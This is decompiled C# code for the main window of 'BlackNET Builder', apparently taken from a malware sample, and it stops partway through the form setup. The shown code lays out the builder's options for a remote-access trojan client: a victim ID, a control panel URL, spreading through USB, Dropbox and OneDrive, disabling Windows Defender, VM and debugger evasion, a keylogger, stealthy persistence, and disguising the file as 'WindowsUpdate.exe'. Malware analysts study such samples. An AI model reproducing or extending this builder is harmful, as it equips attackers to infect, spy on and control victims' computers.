// Decompiled with JetBrains decompiler
// Type: BlackNET_Builder.Main
// Assembly: BlackNET Builder, Version=3.7.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4B8A14F4-2444-48A4-BCEA-3077100A9E22
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Agent.gen-f4461e8b0f3831b6ee77d57f52dd74f28e79114bc5bb29d6b7ab5ca3adbf27f6.exe

using BlackNET_Builder.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Mono.Collections.Generic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace BlackNET_Builder
{
  [DesignerGenerated]
  public class Main : Form
  {
    private IContainer components;
    [AccessedThroughProperty("BuilderTheme")]
    private NSTheme _BuilderTheme;
    [AccessedThroughProperty("BuilderSettings")]
    private NSTabControl _BuilderSettings;
    [AccessedThroughProperty("MainSettings")]
    private TabPage _MainSettings;
    [AccessedThroughProperty("Extra")]
    private TabPage _Extra;
    [AccessedThroughProperty("CloseSoftware")]
    private NSControlButton _CloseSoftware;
    [AccessedThroughProperty("CompileClient")]
    private NSButton _CompileClient;
    [AccessedThroughProperty("PanelURL")]
    private NSTextBox _PanelURL;
    [AccessedThroughProperty("Binder")]
    private TabPage _Binder;
    [AccessedThroughProperty("FilesPaths")]
    private NSListView _FilesPaths;
    [AccessedThroughProperty("Downloader")]
    private TabPage _Downloader;
    [AccessedThroughProperty("ChangeIcon")]
    private TabPage _ChangeIcon;
    [AccessedThroughProperty("VictimID")]
    private NSTextBox _VictimID;
    [AccessedThroughProperty("NsLabel2")]
    private NSLabel _NsLabel2;
    [AccessedThroughProperty("CheckPanel")]
    private NSButton _CheckPanel;
    [AccessedThroughProperty("NsLabel1")]
    private NSLabel _NsLabel1;
    [AccessedThroughProperty("NsLabel3")]
    private NSLabel _NsLabel3;
    [AccessedThroughProperty("DataSplitter")]
    private NSTextBox _DataSplitter;
    [AccessedThroughProperty("NsLabel4")]
    private NSLabel _NsLabel4;
    [AccessedThroughProperty("MUTEX")]
    private NSRandomPool _MUTEX;
    [AccessedThroughProperty("Persistence")]
    private TabPage _Persistence;
    [AccessedThroughProperty("IconListView")]
    private ListView _IconListView;
    [AccessedThroughProperty("InstallPath")]
    private NSComboBox _InstallPath;
    [AccessedThroughProperty("StealthMode")]
    private NSCheckBox _StealthMode;
    [AccessedThroughProperty("FileName")]
    private NSTextBox _FileName;
    [AccessedThroughProperty("NsLabel6")]
    private NSLabel _NsLabel6;
    [AccessedThroughProperty("NsLabel5")]
    private NSLabel _NsLabel5;
    [AccessedThroughProperty("Watchdog")]
    private NSCheckBox _Watchdog;
    [AccessedThroughProperty("DebugMode")]
    private NSCheckBox _DebugMode;
    [AccessedThroughProperty("USBSpread")]
    private NSCheckBox _USBSpread;
    [AccessedThroughProperty("ElevateUAC")]
    private NSCheckBox _ElevateUAC;
    [AccessedThroughProperty("BypassVM")]
    private NSCheckBox _BypassVM;
    [AccessedThroughProperty("AntiDebugging")]
    private NSCheckBox _AntiDebugging;
    [AccessedThroughProperty("EnableAES")]
    private NSCheckBox _EnableAES;
    [AccessedThroughProperty("DropboxSpread")]
    private NSCheckBox _DropboxSpread;
    [AccessedThroughProperty("OnedriveSpread")]
    private NSCheckBox _OnedriveSpread;
    [AccessedThroughProperty("DeleteFile")]
    private NSButton _DeleteFile;
    [AccessedThroughProperty("AddFile")]
    private NSButton _AddFile;
    [AccessedThroughProperty("DroperPath")]
    private NSComboBox _DroperPath;
    [AccessedThroughProperty("NsLabel7")]
    private NSLabel _NsLabel7;
    [AccessedThroughProperty("EnableBinder")]
    private NSCheckBox _EnableBinder;
    [AccessedThroughProperty("DeleteLink")]
    private NSButton _DeleteLink;
    [AccessedThroughProperty("AddLink")]
    private NSButton _AddLink;
    [AccessedThroughProperty("DownloadPath")]
    private NSComboBox _DownloadPath;
    [AccessedThroughProperty("NsLabel8")]
    private NSLabel _NsLabel8;
    [AccessedThroughProperty("EnableDownloader")]
    private NSCheckBox _EnableDownloader;
    [AccessedThroughProperty("DownloadLinksView")]
    private NSListView _DownloadLinksView;
    [AccessedThroughProperty("PoweredBy")]
    private KachClazz _PoweredBy;
    [AccessedThroughProperty("IconList")]
    private ImageList _IconList;
    [AccessedThroughProperty("CustomIconFromFile")]
    private NSRadioButton _CustomIconFromFile;
    [AccessedThroughProperty("CustomIcon")]
    private NSRadioButton _CustomIcon;
    [AccessedThroughProperty("NoIcon")]
    private NSRadioButton _NoIcon;
    [AccessedThroughProperty("AddIconFromFile")]
    private NSButton _AddIconFromFile;
    [AccessedThroughProperty("IconPath")]
    private NSTextBox _IconPath;
    [AccessedThroughProperty("CheckForUpdate")]
    private NSButton _CheckForUpdate;
    [AccessedThroughProperty("ExecutionDelayTime")]
    private NSTextBox _ExecutionDelayTime;
    [AccessedThroughProperty("NsLabel9")]
    private NSLabel _NsLabel9;
    [AccessedThroughProperty("DelayExecution")]
    private NSCheckBox _DelayExecution;
    [AccessedThroughProperty("GenerateSleep")]
    private NSButton _GenerateSleep;
    [AccessedThroughProperty("CriticalProcess")]
    private NSCheckBox _CriticalProcess;
    [AccessedThroughProperty("ClientExt")]
    private NSComboBox _ClientExt;
    [AccessedThroughProperty("DisableWD")]
    private NSCheckBox _DisableWD;
    [AccessedThroughProperty("Startup")]
    private NSRadioButton _Startup;
    [AccessedThroughProperty("SchTask")]
    private NSRadioButton _SchTask;
    [AccessedThroughProperty("GenerateID")]
    private NSButton _GenerateID;
    [AccessedThroughProperty("KeyloggerOnRun")]
    private NSCheckBox _KeyloggerOnRun;
    private SaveFileDialog dialog;
    private OpenFileDialog a;
    public Thread trd;
    public int st;
    private StringBuilder EncryptionKey;
    private OpenFileDialog f;
    private string IconName;
    private string[] files;

    public Main()
    {
      this.Load += new EventHandler(this.Main_Load);
      this.dialog = new SaveFileDialog();
      this.a = new OpenFileDialog();
      this.st = 0;
      this.EncryptionKey = new StringBuilder();
      this.f = new OpenFileDialog();
      this.files = Directory.GetFiles("icons");
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Main));
      this.IconList = new ImageList(this.components);
      this.BuilderTheme = new NSTheme();
      this.ClientExt = new NSComboBox();
      this.CheckForUpdate = new NSButton();
      this.PoweredBy = new KachClazz();
      this.CloseSoftware = new NSControlButton();
      this.CompileClient = new NSButton();
      this.BuilderSettings = new NSTabControl();
      this.MainSettings = new TabPage();
      this.GenerateID = new NSButton();
      this.DataSplitter = new NSTextBox();
      this.NsLabel4 = new NSLabel();
      this.MUTEX = new NSRandomPool();
      this.VictimID = new NSTextBox();
      this.NsLabel2 = new NSLabel();
      this.CheckPanel = new NSButton();
      this.PanelURL = new NSTextBox();
      this.NsLabel1 = new NSLabel();
      this.NsLabel3 = new NSLabel();
      this.Persistence = new TabPage();
      this.CriticalProcess = new NSCheckBox();
      this.GenerateSleep = new NSButton();
      this.ExecutionDelayTime = new NSTextBox();
      this.NsLabel9 = new NSLabel();
      this.DelayExecution = new NSCheckBox();
      this.Watchdog = new NSCheckBox();
      this.InstallPath = new NSComboBox();
      this.StealthMode = new NSCheckBox();
      this.FileName = new NSTextBox();
      this.NsLabel6 = new NSLabel();
      this.NsLabel5 = new NSLabel();
      this.Startup = new NSRadioButton();
      this.SchTask = new NSRadioButton();
      this.Extra = new TabPage();
      this.KeyloggerOnRun = new NSCheckBox();
      this.DisableWD = new NSCheckBox();
      this.DebugMode = new NSCheckBox();
      this.USBSpread = new NSCheckBox();
      this.ElevateUAC = new NSCheckBox();
      this.BypassVM = new NSCheckBox();
      this.EnableAES = new NSCheckBox();
      this.OnedriveSpread = new NSCheckBox();
      this.DropboxSpread = new NSCheckBox();
      this.AntiDebugging = new NSCheckBox();
      this.Binder = new TabPage();
      this.DeleteFile = new NSButton();
      this.AddFile = new NSButton();
      this.DroperPath = new NSComboBox();
      this.NsLabel7 = new NSLabel();
      this.EnableBinder = new NSCheckBox();
      this.FilesPaths = new NSListView();
      this.Downloader = new TabPage();
      this.DeleteLink = new NSButton();
      this.AddLink = new NSButton();
      this.DownloadPath = new NSComboBox();
      this.NsLabel8 = new NSLabel();
      this.EnableDownloader = new NSCheckBox();
      this.DownloadLinksView = new NSListView();
      this.ChangeIcon = new TabPage();
      this.CustomIconFromFile = new NSRadioButton();
      this.CustomIcon = new NSRadioButton();
      this.NoIcon = new NSRadioButton();
      this.AddIconFromFile = new NSButton();
      this.IconPath = new NSTextBox();
      this.IconListView = new ListView();
      this.BuilderTheme.SuspendLayout();
      this.BuilderSettings.SuspendLayout();
      this.MainSettings.SuspendLayout();
      this.Persistence.SuspendLayout();
      this.Extra.SuspendLayout();
      this.Binder.SuspendLayout();
      this.Downloader.SuspendLayout();
      this.ChangeIcon.SuspendLayout();
      this.SuspendLayout();
      this.IconList.ColorDepth = ColorDepth.Depth32Bit;
      ImageList iconList = this.IconList;
      Size size1 = new Size(32, 32);
      Size size2 = size1;
      iconList.ImageSize = size2;
      this.IconList.TransparentColor = Color.Transparent;
      this.BuilderTheme.AccentOffset = 42;
      this.BuilderTheme.BackColor = Color.FromArgb(50, 50, 50);
      this.BuilderTheme.BorderStyle = FormBorderStyle.None;
      this.BuilderTheme.Colors = new Bloom[0];
      this.BuilderTheme.Controls.Add((Control) this.ClientExt);
      this.BuilderTheme.Controls.Add((Control) this.CheckForUpdate);
      this.BuilderTheme.Controls.Add((Control) this.PoweredBy);
      this.BuilderTheme.Controls.Add((Control) this.CloseSoftware);
      this.BuilderTheme.Controls.Add((Control) this.CompileClient);
      this.BuilderTheme.Controls.Add((Control) this.BuilderSettings);
      this.BuilderTheme.Customization = "";
      this.BuilderTheme.Dock = DockStyle.Fill;
      this.BuilderTheme.Font = new Font("Verdana", 8f);
      this.BuilderTheme.Image = (Image) null;
      NSTheme builderTheme1 = this.BuilderTheme;
      Point point1 = new Point(0, 0);
      Point point2 = point1;
      builderTheme1.Location = point2;
      this.BuilderTheme.Movable = true;
      this.BuilderTheme.Name = "BuilderTheme";
      this.BuilderTheme.NoRounding = false;
      this.BuilderTheme.Sizable = false;
      NSTheme builderTheme2 = this.BuilderTheme;
      size1 = new Size(519, 261);
      Size size3 = size1;
      builderTheme2.Size = size3;
      this.BuilderTheme.SmartBounds = true;
      this.BuilderTheme.StartPosition = FormStartPosition.CenterScreen;
      this.BuilderTheme.TabIndex = 0;
      this.BuilderTheme.Text = "BlackNET Builder";
      this.BuilderTheme.TransparencyKey = Color.Empty;
      this.BuilderTheme.Transparent = false;
      this.ClientExt.BackColor = Color.FromArgb(50, 50, 50);
      this.ClientExt.DrawMode = DrawMode.OwnerDrawFixed;
      this.ClientExt.DropDownStyle = ComboBoxStyle.DropDownList;
      this.ClientExt.ForeColor = Color.FromArgb(235, 235, 235);
      this.ClientExt.FormattingEnabled = true;
      this.ClientExt.Items.AddRange(new object[5]
      {
        (object) ".EXE - Executable",
        (object) ".BAT - BAT File",
        (object) ".CMD - CMD File",
        (object) ".SCR - Screen Saver",
        (object) ".PIF - PIF File"
      });
      NSComboBox clientExt1 = this.ClientExt;
      point1 = new Point(12, 233);
      Point point3 = point1;
      clientExt1.Location = point3;
      this.ClientExt.Name = "ClientExt";
      NSComboBox clientExt2 = this.ClientExt;
      size1 = new Size(121, 21);
      Size size4 = size1;
      clientExt2.Size = size4;
      this.ClientExt.TabIndex = 10;
      NSButton checkForUpdate1 = this.CheckForUpdate;
      point1 = new Point(397, 233);
      Point point4 = point1;
      checkForUpdate1.Location = point4;
      this.CheckForUpdate.Name = "CheckForUpdate";
      NSButton checkForUpdate2 = this.CheckForUpdate;
      size1 = new Size(110, 23);
      Size size5 = size1;
      checkForUpdate2.Size = size5;
      this.CheckForUpdate.TabIndex = 9;
      this.CheckForUpdate.Text = "Check for Update";
      this.PoweredBy.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold);
      KachClazz poweredBy1 = this.PoweredBy;
      point1 = new Point(322, 233);
      Point point5 = point1;
      poweredBy1.Location = point5;
      this.PoweredBy.Name = "PoweredBy";
      KachClazz poweredBy2 = this.PoweredBy;
      size1 = new Size(75, 23);
      Size size6 = size1;
      poweredBy2.Size = size6;
      this.PoweredBy.TabIndex = 2;
      this.PoweredBy.Text = "BlackNET";
      this.PoweredBy.Value1 = "Black";
      this.PoweredBy.Value2 = "NET";
      this.CloseSoftware.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.CloseSoftware.ControlButton = NSControlButton.Button.Close;
      NSControlButton closeSoftware1 = this.CloseSoftware;
      point1 = new Point(493, 4);
      Point point6 = point1;
      closeSoftware1.Location = point6;
      NSControlButton closeSoftware2 = this.CloseSoftware;
      Padding padding1 = new Padding(0);
      Padding padding2 = padding1;
      closeSoftware2.Margin = padding2;
      NSControlButton closeSoftware3 = this.CloseSoftware;
      size1 = new Size(18, 20);
      Size size7 = size1;
      closeSoftware3.MaximumSize = size7;
      NSControlButton closeSoftware4 = this.CloseSoftware;
      size1 = new Size(18, 20);
      Size size8 = size1;
      closeSoftware4.MinimumSize = size8;
      this.CloseSoftware.Name = "CloseSoftware";
      NSControlButton closeSoftware5 = this.CloseSoftware;
      size1 = new Size(18, 20);
      Size size9 = size1;
      closeSoftware5.Size = size9;
      this.CloseSoftware.TabIndex = 1;
      this.CloseSoftware.Text = "Close";
      this.CompileClient.Font = new Font("Verdana", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      NSButton compileClient1 = this.CompileClient;
      point1 = new Point(138, 232);
      Point point7 = point1;
      compileClient1.Location = point7;
      this.CompileClient.Name = "CompileClient";
      NSButton compileClient2 = this.CompileClient;
      size1 = new Size(109, 23);
      Size size10 = size1;
      compileClient2.Size = size10;
      this.CompileClient.TabIndex = 0;
      this.CompileClient.Text = "Compile Client";
      this.BuilderSettings.Alignment = TabAlignment.Left;
      this.BuilderSettings.Controls.Add((Control) this.MainSettings);
      this.BuilderSettings.Controls.Add((Control) this.Persistence);
      this.BuilderSettings.Controls.Add((Control) this.Extra);
      this.BuilderSettings.Controls.Add((Control) this.Binder);
      this.BuilderSettings.Controls.Add((Control) this.Downloader);
      this.BuilderSettings.Controls.Add((Control) this.ChangeIcon);
      this.BuilderSettings.DrawMode = TabDrawMode.OwnerDrawFixed;
      NSTabControl builderSettings1 = this.BuilderSettings;
      size1 = new Size(28, 115);
      Size size11 = size1;
      builderSettings1.ItemSize = size11;
      NSTabControl builderSettings2 = this.BuilderSettings;
      point1 = new Point(12, 36);
      Point point8 = point1;
      builderSettings2.Location = point8;
      this.BuilderSettings.Multiline = true;
      this.BuilderSettings.Name = "BuilderSettings";
      this.BuilderSettings.SelectedIndex = 0;
      NSTabControl builderSettings3 = this.BuilderSettings;
      size1 = new Size(495, 191);
      Size size12 = size1;
      builderSettings3.Size = size12;
      this.BuilderSettings.SizeMode = TabSizeMode.Fixed;
      this.BuilderSettings.TabIndex = 0;
      this.MainSettings.BackColor = Color.FromArgb(50, 50, 50);
      this.MainSettings.Controls.Add((Control) this.GenerateID);
      this.MainSettings.Controls.Add((Control) this.DataSplitter);
      this.MainSettings.Controls.Add((Control) this.NsLabel4);
      this.MainSettings.Controls.Add((Control) this.MUTEX);
      this.MainSettings.Controls.Add((Control) this.VictimID);
      this.MainSettings.Controls.Add((Control) this.NsLabel2);
      this.MainSettings.Controls.Add((Control) this.CheckPanel);
      this.MainSettings.Controls.Add((Control) this.PanelURL);
      this.MainSettings.Controls.Add((Control) this.NsLabel1);
      this.MainSettings.Controls.Add((Control) this.NsLabel3);
      TabPage mainSettings1 = this.MainSettings;
      point1 = new Point(119, 4);
      Point point9 = point1;
      mainSettings1.Location = point9;
      this.MainSettings.Name = "MainSettings";
      TabPage mainSettings2 = this.MainSettings;
      padding1 = new Padding(3);
      Padding padding3 = padding1;
      mainSettings2.Padding = padding3;
      TabPage mainSettings3 = this.MainSettings;
      size1 = new Size(372, 183);
      Size size13 = size1;
      mainSettings3.Size = size13;
      this.MainSettings.TabIndex = 0;
      this.MainSettings.Text = "Main Settings";
      NSButton generateId1 = this.GenerateID;
      point1 = new Point(232, 35);
      Point point10 = point1;
      generateId1.Location = point10;
      this.GenerateID.Name = "GenerateID";
      NSButton generateId2 = this.GenerateID;
      size1 = new Size(85, 23);
      Size size14 = size1;
      generateId2.Size = size14;
      this.GenerateID.TabIndex = 1;
      this.GenerateID.Text = "Generate ID";
      this.DataSplitter.Cursor = Cursors.IBeam;
      NSTextBox dataSplitter1 = this.DataSplitter;
      point1 = new Point(65, 149);
      Point point11 = point1;
      dataSplitter1.Location = point11;
      this.DataSplitter.MaxLength = (int) short.MaxValue;
      this.DataSplitter.Multiline = false;
      this.DataSplitter.Name = "DataSplitter";
      this.DataSplitter.ReadOnly = false;
      NSTextBox dataSplitter2 = this.DataSplitter;
      size1 = new Size(161, 23);
      Size size15 = size1;
      dataSplitter2.Size = size15;
      this.DataSplitter.TabIndex = 8;
      this.DataSplitter.Text = "|BN|";
      this.DataSplitter.TextAlign = HorizontalAlignment.Left;
      this.DataSplitter.UseSystemPasswordChar = false;
      this.NsLabel4.Font = new Font("Segoe UI", 8.25f);
      NSLabel nsLabel4_1 = this.NsLabel4;
      point1 = new Point(16, 149);
      Point point12 = point1;
      nsLabel4_1.Location = point12;
      this.NsLabel4.Name = "NsLabel4";
      NSLabel nsLabel4_2 = this.NsLabel4;
      size1 = new Size(75, 23);
      Size size16 = size1;
      nsLabel4_2.Size = size16;
      this.NsLabel4.TabIndex = 7;
      this.NsLabel4.Value1 = "Splitter: ";
      NSRandomPool mutex1 = this.MUTEX;
      point1 = new Point(65, 64);
      Point point13 = point1;
      mutex1.Location = point13;
      this.MUTEX.Name = "MUTEX";
      NSRandomPool mutex2 = this.MUTEX;
      size1 = new Size(161, 79);
      Size size17 = size1;
      mutex2.Size = size17;
      this.MUTEX.TabIndex = 5;
      this.MUTEX.Text = "NsRandomPool1";
      this.VictimID.Cursor = Cursors.IBeam;
      NSTextBox victimId1 = this.VictimID;
      point1 = new Point(65, 35);
      Point point14 = point1;
      victimId1.Location = point14;
      this.VictimID.MaxLength = 6;
      this.VictimID.Multiline = false;
      this.VictimID.Name = "VictimID";
      this.VictimID.ReadOnly = false;
      NSTextBox victimId2 = this.VictimID;
      size1 = new Size(161, 23);
      Size size18 = size1;
      victimId2.Size = size18;
      this.VictimID.TabIndex = 4;
      this.VictimID.Text = "HacKed";
      this.VictimID.TextAlign = HorizontalAlignment.Left;
      this.VictimID.UseSystemPasswordChar = false;
      this.NsLabel2.Font = new Font("Segoe UI", 8.25f);
      NSLabel nsLabel2_1 = this.NsLabel2;
      point1 = new Point(7, 35);
      Point point15 = point1;
      nsLabel2_1.Location = point15;
      this.NsLabel2.Name = "NsLabel2";
      NSLabel nsLabel2_2 = this.NsLabel2;
      size1 = new Size(75, 23);
      Size size19 = size1;
      nsLabel2_2.Size = size19;
      this.NsLabel2.TabIndex = 3;
      this.NsLabel2.Text = "NsLabel2";
      this.NsLabel2.Value1 = "Victim ID: ";
      NSButton checkPanel1 = this.CheckPanel;
      point1 = new Point(232, 6);
      Point point16 = point1;
      checkPanel1.Location = point16;
      this.CheckPanel.Name = "CheckPanel";
      NSButton checkPanel2 = this.CheckPanel;
      size1 = new Size(85, 23);
      Size size20 = size1;
      checkPanel2.Size = size20;
      this.CheckPanel.TabIndex = 2;
      this.CheckPanel.Text = "Check Panel";
      this.PanelURL.Cursor = Cursors.IBeam;
      NSTextBox panelUrl1 = this.PanelURL;
      point1 = new Point(65, 6);
      Point point17 = point1;
      panelUrl1.Location = point17;
      this.PanelURL.MaxLength = (int) short.MaxValue;
      this.PanelURL.Multiline = false;
      this.PanelURL.Name = "PanelURL";
      this.PanelURL.ReadOnly = false;
      NSTextBox panelUrl2 = this.PanelURL;
      size1 = new Size(161, 23);
      Size size21 = size1;
      panelUrl2.Size = size21;
      this.PanelURL.TabIndex = 0;
      this.PanelURL.Text = "http://localhost/blacknet";
      this.PanelURL.TextAlign = HorizontalAlignment.Left;
      this.PanelURL.UseSystemPasswordChar = false;
      this.NsLabel1.Font = new Font("Segoe UI", 8.25f);
      NSLabel nsLabel1_1 = this.NsLabel1;
      point1 = new Point(16, 6);
      Point point18 = point1;
      nsLabel1_1.Location = point18;
      this.NsLabel1.Name = "NsLabel1";
      NSLabel nsLabel1_2 = this.NsLabel1;
      size1 = new Size(51, 23);
      Size size22 = size1;
      nsLabel1_2.Size = size22;
      this.NsLabel1.TabIndex = 1;
      this.NsLabel1.Text = "BN URL: ";
      this.NsLabel1.Value1 = "BN URL: ";
      this.NsLabel3.Font = new Font("Segoe UI", 8.25f);
      NSLabel nsLabel3_1 = this.NsLabel3;
      point1 = new Point(16, 91);
      Point point19 = point1;
      nsLabel3_1.Location = point19;
      this.NsLabel3.Name = "NsLabel3";
      NSLabel nsLabel3_2 = this.NsLabel3;
      size1 = new Size(75, 23);
      Size size23 = size1;
      nsLabel3_2.Size = size23;
      this.NsLabel3.TabIndex = 6;
      this.NsLabel3.Value1 = "MUTEX: ";
      this.Persistence.BackColor = Color.FromArgb(50, 50, 50);
      this.Persistence.Controls.Add((Control) this.CriticalProcess);
      this.Persistence.Controls.Add((Control) this.GenerateSleep);
      this.Persistence.Controls.Add((Control) this.ExecutionDelayTime);
      this.Persistence.Controls.Add((Control) this.NsLabel9);
      this.Persistence.Controls.Add((Control) this.DelayExecution);
      this.Persistence.Controls.Add((Control) this.Watchdog);
      this.Persistence.Controls.Add((Control) this.InstallPath);
      this.Persistence.Controls.Add((Control) this.StealthMode);
      this.Persistence.Controls.Add((Control) this.FileName);
      this.Persistence.Controls.Add((Control) this.NsLabel6);
      this.Persistence.Controls.Add((Control) this.NsLabel5);
      this.Persistence.Controls.Add((Control) this.Startup);
      this.Persistence.Controls.Add((Control) this.SchTask);
      TabPage persistence1 = this.Persistence;
      point1 = new Point(119, 4);
      Point point20 = point1;
      persistence1.Location = point20;
      this.Persistence.Name = "Persistence";
      TabPage persistence2 = this.Persistence;
      size1 = new Size(372, 183);
      Size size24 = size1;
      persistence2.Size = size24;
      this.Persistence.TabIndex = 5;
      this.Persistence.Text = "Persistence";
      this.CriticalProcess.Checked = false;
      NSCheckBox criticalProcess1 = this.CriticalProcess;
      point1 = new Point(137, 67);
      Point point21 = point1;
      criticalProcess1.Location = point21;
      this.CriticalProcess.Name = "CriticalProcess";
      NSCheckBox criticalProcess2 = this.CriticalProcess;
      size1 = new Size(129, 23);
      Size size25 = size1;
      criticalProcess2.Size = size25;
      this.CriticalProcess.TabIndex = 12;
      this.CriticalProcess.Text = "Critical Process";
      NSButton generateSleep1 = this.GenerateSleep;
      point1 = new Point(200, 151);
      Point point22 = point1;
      generateSleep1.Location = point22;
      this.GenerateSleep.Name = "GenerateSleep";
      NSButton generateSleep2 = this.GenerateSleep;
      size1 = new Size(66, 23);
      Size size26 = size1;
      generateSleep2.Size = size26;
      this.GenerateSleep.TabIndex = 10;
      this.GenerateSleep.Text = "Generate";
      this.ExecutionDelayTime.Cursor = Cursors.IBeam;
      NSTextBox executionDelayTime1 = this.ExecutionDelayTime;
      point1 = new Point(73, 151);
      Point point23 = point1;
      executionDelayTime1.Location = point23;
      this.ExecutionDelayTime.MaxLength = (int) short.MaxValue;
      this.ExecutionDelayTime.Multiline = false;
      this.ExecutionDelayTime.Name = "ExecutionDelayTime";
      this.ExecutionDelayTime.ReadOnly = false;
      NSTextBox executionDelayTime2 = this.ExecutionDelayTime;
      size1 = new Size(121, 23);
      Size size27 = size1;
      executionDelayTime2.Size = size27;
      this.ExecutionDelayTime.TabIndex = 11;
      this.ExecutionDelayTime.Text = "1000";
      this.ExecutionDelayTime.TextAlign = HorizontalAlignment.Left;
      this.ExecutionDelayTime.UseSystemPasswordChar = false;
      this.NsLabel9.Font = new Font("Segoe UI", 8.25f);
      NSLabel nsLabel9_1 = this.NsLabel9;
      point1 = new Point(5, 151);
      Point point24 = point1;
      nsLabel9_1.Location = point24;
      this.NsLabel9.Name = "NsLabel9";
      NSLabel nsLabel9_2 = this.NsLabel9;
      size1 = new Size(75, 23);
      Size size28 = size1;
      nsLabel9_2.Size = size28;
      this.NsLabel9.TabIndex = 10;
      this.NsLabel9.Text = "NsLabel9";
      this.NsLabel9.Value1 = "Sleep Time: ";
      this.DelayExecution.Checked = false;
      NSCheckBox delayExecution1 = this.DelayExecution;
      point1 = new Point(16, 67);
      Point point25 = point1;
      delayExecution1.Location = point25;
      this.DelayExecution.Name = "DelayExecution";
      NSCheckBox delayExecution2 = this.DelayExecution;
      size1 = new Size(115, 23);
      Size size29 = size1;
      delayExecution2.Size = size29;
      this.DelayExecution.TabIndex = 9;
      this.DelayExecution.Text = "Delay Execution";
      this.Watchdog.Checked = false;
      NSCheckBox watchdog1 = this.Watchdog;
      point1 = new Point(137, 38);
      Point point26 = point1;
      watchdog1.Location = point26;
      this.Watchdog.Name = "Watchdog";
      NSCheckBox watchdog2 = this.Watchdog;
      size1 = new Size(159, 23);
      Size size30 = size1;
      watchdog2.Size = size30;
      this.Watchdog.TabIndex = 8;
      this.Watchdog.Text = "Enable Watchdog";
      this.InstallPath.BackColor = Color.FromArgb(50, 50, 50);
      this.InstallPath.DrawMode = DrawMode.OwnerDrawFixed;
      this.InstallPath.DropDownStyle = ComboBoxStyle.DropDownList;
      this.InstallPath.Enabled = false;
      this.InstallPath.ForeColor = Color.FromArgb(235, 235, 235);
      this.InstallPath.FormattingEnabled = true;
      this.InstallPath.Items.AddRange(new object[5]
      {
        (object) "Temp ",
        (object) "AppData",
        (object) "UserProfile",
        (object) "ProgramData",
        (object) "WinDir"
      });
      NSComboBox installPath1 = this.InstallPath;
      point1 = new Point(73, 125);
      Point point27 = point1;
      installPath1.Location = point27;
      this.InstallPath.Name = "InstallPath";
      NSComboBox installPath2 = this.InstallPath;
      size1 = new Size(121, 21);
      Size size31 = size1;
      installPath2.Size = size31;
      this.InstallPath.TabIndex = 7;
      this.StealthMode.Checked = false;
      NSCheckBox stealthMode1 = this.StealthMode;
      point1 = new Point(16, 38);
      Point point28 = point1;
      stealthMode1.Location = point28;
      this.StealthMode.Name = "StealthMode";
      NSCheckBox stealthMode2 = this.StealthMode;
      size1 = new Size(115, 23);
      Size size32 = size1;
      stealthMode2.Size = size32;
      this.StealthMode.TabIndex = 4;
      this.StealthMode.Text = "Stealth Mode";
      this.FileName.Cursor = Cursors.IBeam;
      this.FileName.Enabled = false;
      NSTextBox fileName1 = this.FileName;
      point1 = new Point(73, 96);
      Point point29 = point1;
      fileName1.Location = point29;
      this.FileName.MaxLength = (int) short.MaxValue;
      this.FileName.Multiline = false;
      this.FileName.Name = "FileName";
      this.FileName.ReadOnly = false;
      NSTextBox fileName2 = this.FileName;
      size1 = new Size(121, 23);
      Size size33 = size1;
      fileName2.Size = size33;
      this.FileName.TabIndex = 2;
      this.FileName.Text = "WindowsUpdate.exe";
      this.FileName.TextAlign = HorizontalAlignment.Left;
      this.FileName.UseSystemPasswordChar = false;
      this.NsLabel6.Font = new Font("Segoe UI", 8.25f);
      NSLabel nsLabel6_1 = this.NsLabel6;
      point1 = new Point(39, 123);
      Point point30 = point1;
      nsLabel6_1.Location = point30;
      this.NsLabel6.Name = "NsLabel6";
      NSLabel nsLabel6_2 = this.NsLabel6;
      size1 = new Size(75, 23);
      Size size34 = size1;
      nsLabel6_2.Size = size34;
      this.NsLabel6.TabIndex = 1;
      this.NsLabel6.Text = "Path: ";
      this.NsLabel6.Value1 = "Path: ";
      this.NsLabel5.Font = new Font("Segoe UI", 8.25f);
      NSLabel nsLabel5_1 = this.NsLabel5;
      point1 = new Point(12, 96);
      Point point31 = point1;
      nsLabel5_1.Location = point31;
      this.NsLabel5.Name = "NsLabel5";
      NSLabel nsLabel5_2 = this.NsLabel5;
      size1 = new Size(75, 23);
      Size size35 = size1;
      nsLabel5_2.Size = size35;
      this.NsLabel5.TabIndex = 0;
      this.NsLabel5.Text = "File Name: ";
      this.NsLabel5.Value1 = "File Name: ";
      this.Startup.Checked = false;
      NSRadioButton startup1 = this.Startup;
      point1 = new Point(16, 9);
      Point point32 = point1;
      startup1.Location = point32;
      this.Startup.Name = "Startup";
      NSRadioButton startup2 = this.Startup;
      size1 = new Size(115, 23);
      Size size36 = size1;
      startup2.Size = size36;
      this.Startup.TabIndex = 13;
      this.Startup.Text = "Add to Startup";
      this.SchTask.Checked = false;
      NSRadioButton schTask1 = this.SchTask;
      point1 = new Point(137, 9);
      Point point33 = point1;
      schTask1.Location = point33;
      this.SchTask.Name = "SchTask";
      NSRadioButton schTask2 = this.SchTask;
      size1 = new Size(159, 23);
      Size size37 = size1;
      schTask2.Size = size37;
      this.SchTask.TabIndex = 14;
      this.SchTask.Text = "Add to Scheduled tasks";
      this.Extra.BackColor = Color.FromArgb(50, 50, 50);
      this.Extra.Controls.Add((Control) this.KeyloggerOnRun);
      this.Extra.Controls.Add((Control) this.DisableWD);
      this.Extra.Controls.Add((Control) this.DebugMode);
      this.Extra.Controls.Add((Control) this.USBSpread);
      this.Extra.Controls.Add((Control) this.ElevateUAC);
